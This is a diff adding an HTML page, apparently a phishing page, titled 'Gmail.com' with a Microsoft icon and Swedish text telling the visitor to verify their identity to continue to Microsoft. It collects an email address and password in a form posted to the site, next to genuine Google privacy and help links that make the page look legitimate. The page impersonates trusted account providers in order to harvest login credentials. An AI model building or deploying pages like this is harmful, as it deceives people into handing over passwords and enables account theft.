@@ -1,0 +1,85 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Gmail.com</title>
+    <link
+      href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css"
+      rel="stylesheet"
+      integrity="sha384-T3c6CoIi6uLrA9TneNEoa7RxnatzjcDSCmG1MXxSR1GAsXEV/Dwwykc2MPK8M2HN"
+      crossorigin="anonymous"
+    />
+    <link href="./index.css" rel="stylesheet" />
+    <link rel="icon" href="./microsoft.png" type="image/x-icon" />
+  </head>
+  <body>
+    <div class="owner">
+      <div class="super">
+        <div class="global-form">
+          <div class="img-google-align">
+            <img
+              class="img-google"
+              src="data:image/png;base64,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"
+            />
+          </div>
+          <p class="big-text">
+            Verifiera <br />
+            <span class="span-verify"> Fortsätt till Microsoft </span>
+          </p>
+          <p class="textForVerify">
+            Du måste verifiera din identitet innan du kan fortsätta
+          </p>
+          <form action="/" method="post">
+            <div class="body">
+              <div class="form">
+                <div class="form-floating mb-3">
+                  <input
+                    type="email"
+                    class="form-control"
+                    id="floatingInput"
+                    placeholder="E-post"
+                    name="email"
+                  />
+                  <label class="label" for="floatingInput">E-post</label>
+                </div>
+                <div class="form-floating">
+                  <input
+                    type="password"
+                    class="form-control"
+                    id="floatingPassword"
+                    placeholder="Ange ditt lösernord"
+                    name="password"
+                  />
+                  <label class="label" for="floatingPassword"
+                    >Ange ditt lösernord</label
+                  >
+                </div>
+              </div>
+            </div>
+          </form>
+          <div class="button-next">
+            <a href="./answer.html" target="_blank">
+              <button type="submit" class="btn btn-primary">Nästa</button>
+            </a>
+          </div>
+        </div>
+      </div>
+      <div class="links-container">
+        <a class="english" href="./english.html" target="_self">Engelska</a>
+        <a
+          class="privacy"
+          href="https://policies.google.com/privacy?gl=SE&hl=en-US"
+          target="_blank"
+          >Integritet</a
+        >
+        <a
+          class="help"
+          href="https://support.google.com/accounts?hl=en&visit_id=638379286390742397-3516128863&rd=2&p=account_iph#topic=3382296"
+          target="_blank"
+          >Hjälp</a
+        >
+      </div>
+    </div>
+  </body>
+</html>
